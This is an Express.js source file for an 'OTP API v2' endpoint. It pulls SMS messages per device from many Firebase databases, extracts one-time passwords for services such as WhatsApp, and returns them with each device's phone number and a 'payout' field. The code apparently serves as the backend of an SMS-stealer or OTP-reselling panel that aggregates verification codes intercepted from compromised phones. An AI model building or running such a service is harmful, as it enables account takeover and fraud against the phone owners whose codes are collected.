"use strict";

/**
 * OTP API v2 — Clean JSON object format.
 *
 * GET /api/v2/otp
 * GET /api/v2/otp?count=10
 *
 * Response:
 * {
 *   "status": "success",
 *   "total": 150,
 *   "data": [
 *     { "dt": "2026-08-13 11:07:06", "num": "919876543210", "cli": "WhatsApp", "message": "...", "payout": "0" },
 *     ...
 *   ]
 * }
 */

const { Router } = require("express");
const ConnectionsService = require("../services/connections");
const FirebaseService = require("../services/firebase");
const DeviceService = require("../services/devices");
const OtpExtractor = require("../services/otpExtractor");
const { getPhone } = require("../utils/phone");

const router = Router();

let _cache = { data: null, timestamp: 0 };
const CACHE_TTL_MS = 10000;

router.get("/otp", async (req, res, next) => {
  try {
    const countParam = req.query.count;
    // Default: 50 OTPs. Use count=0 or count=all for everything.
    let count;
    if (countParam === "0" || countParam === "all") {
      count = 0; // show all
    } else if (countParam) {
      count = Math.min(parseInt(countParam) || 50, 500);
    } else {
      count = 50; // default limit
    }
    const fresh = req.query.fresh === "1";

    // Check cache
    if (!fresh && _cache.data && (Date.now() - _cache.timestamp) < CACHE_TTL_MS) {
      const sliced = count > 0 ? _cache.data.slice(0, count) : _cache.data;
      return res.type("application/json").send(JSON.stringify({ status: "success", total: sliced.length, data: sliced }, null, 4));
    }

    const connections = await ConnectionsService.getAllActive();
    if (connections.length === 0) {
      return res.type("application/json").send(JSON.stringify({ status: "success", total: 0, data: [] }, null, 4));
    }

    const allOtps = [];

    const results = await Promise.allSettled(
      connections.map(async (conn) => {
        try {
          const [clientsData, messagesRoot] = await Promise.all([
            FirebaseService.read(conn.url, conn.key, "clients").catch(() => null),
            FirebaseService.read(conn.url, conn.key, "messages").catch(() => null),
          ]);

          const devices = DeviceService.parseAll(clientsData);
          const connOtps = [];

          if (messagesRoot && typeof messagesRoot === "object") {
            for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
              if (!deviceMessages || typeof deviceMessages !== "object") continue;

              const device = devices.find((d) => d.id === deviceId) || { id: deviceId };
              const msgArray = Object.values(deviceMessages);
              let phone = getPhone(device, clientsData?.[deviceId], msgArray);

              for (const [, msg] of Object.entries(deviceMessages)) {
                if (!msg || typeof msg !== "object") continue;

                const text = msg.text || msg.body || msg.message || "";
                if (!OtpExtractor.isOtpMessage(text)) continue;

                const extracted = OtpExtractor.extractOtp(text);
                if (!extracted) continue;

                const ts = getTimestamp(msg);

                connOtps.push({
                  dt: ts,
                  num: phone || "Unknown",
                  cli: extracted.service,
                  message: text.trim(),
                  payout: "0",
                });
              }
            }
          }

          return connOtps;
        } catch {
          return [];
        }
      })
    );

    for (const result of results) {
      if (result.status === "fulfilled") allOtps.push(...result.value);
    }

    // Sort by dt (newest first)
    allOtps.sort((a, b) => {
      const da = new Date(a.dt).getTime() || 0;
      const db = new Date(b.dt).getTime() || 0;
      return db - da;
    });

    _cache = { data: allOtps, timestamp: Date.now() };
    const sliced = count > 0 ? allOtps.slice(0, count) : allOtps;

    res.type("application/json").send(JSON.stringify({ status: "success", total: sliced.length, data: sliced }, null, 4));
  } catch (err) {
    next(err);
  }
});

// ═══ Helpers (same as v1) ════════════════════════════════


function getTimestamp(msg) {
  const raw = msg.timestamp || msg.time || msg.date || msg.receivedAt
    || msg.createdAt || msg.sentAt || msg.ts || "";
  if (!raw) return formatNow();
  if (typeof raw === "number") {
    const ms = raw > 1e12 ? raw : raw * 1000;
    return formatDate(new Date(ms));
  }
  const d = new Date(raw);
  if (!isNaN(d.getTime())) return formatDate(d);
  if (typeof raw === "string" && /\d{4}[-/]\d{2}[-/]\d{2}/.test(raw)) {
    return raw.replace(/\//g, "-").slice(0, 19);
  }
  return formatNow();
}

function formatDate(d) {
  const pad = (n) => String(n).padStart(2, "0");
  return `${d.getUTCFullYear()}-${pad(d.getUTCMonth()+1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
}

function formatNow() { return formatDate(new Date()); }

module.exports = router;
